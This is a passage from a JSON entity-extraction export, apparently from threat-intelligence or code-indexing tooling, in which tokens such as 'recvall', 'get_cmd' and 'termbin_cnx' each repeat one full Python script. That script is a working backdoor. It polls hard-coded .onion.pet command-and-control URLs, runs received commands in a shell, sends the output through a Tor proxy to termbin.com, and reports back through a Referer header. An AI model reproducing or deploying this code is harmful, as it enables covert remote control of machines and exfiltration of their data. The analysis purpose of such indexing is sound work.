\"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xf99ae56b>",
                    "type": "UnknownWord",
                    "value": "recvall"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x370ba6b0>",
                    "type": "UnknownWord",
                    "value": "sock"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xe7e3373d>",
                    "type": "UnknownWord",
                    "value": "get_cmd"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xbd9e2f>",
                    "type": "UnknownWord",
                    "value": "req"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xe1878a4a>",
                            "type": "File",
                            "value": "requests.get"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xbd9e2f>",
                            "type": "UnknownWord",
                            "value": "req"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xeb89dc00>",
                    "type": "UnknownWord",
                    "value": "strip"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x7bc819d3>",
                            "type": "File",
                            "value": "recv.decode"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeb89dc00>",
                            "type": "UnknownWord",
                            "value": "strip"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xe1878a4a>",
                            "type": "File",
                            "value": "requests.get"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeb89dc00>",
                            "type": "UnknownWord",
                            "value": "strip"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x3a044173>",
                    "type": "UnknownWord",
                    "value": "run_cmd"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x15b05971>",
                    "type": "UnknownWord",
                    "value": "cmd_split"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x8f6856f3>",
                            "type": "File",
                            "value": "cmd.split"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x15b05971>",
                            "type": "UnknownWord",
                            "value": "cmd_split"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xce71ac19>",
                    "type": "UnknownWord",
                    "value": "--"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x8f6856f3>",
                            "type": "File",
                            "value": "cmd.split"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xce71ac19>",
                            "type": "UnknownWord",
                            "value": "--"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xf5f3e975>",
                    "type": "UnknownWord",
                    "value": "termbin_cnx"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xaaec47f2>",
                            "type": "File",
                            "value": "socks.socksocket"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xf5f3e975>",
                            "type": "UnknownWord",
                            "value": "termbin_cnx"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x47aadca4>",
                            "type": "File",
                            "value": "socket.socket"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xf5f3e975>",
                            "type": "UnknownWord",
                            "value": "termbin_cnx"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x1d0e0e13>",
                    "type": "UnknownWord",
                    "value": "af_inet"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x47aadca4>",
                            "type": "File",
                            "value": "socket.socket"
                        },
                        "relation": "related",
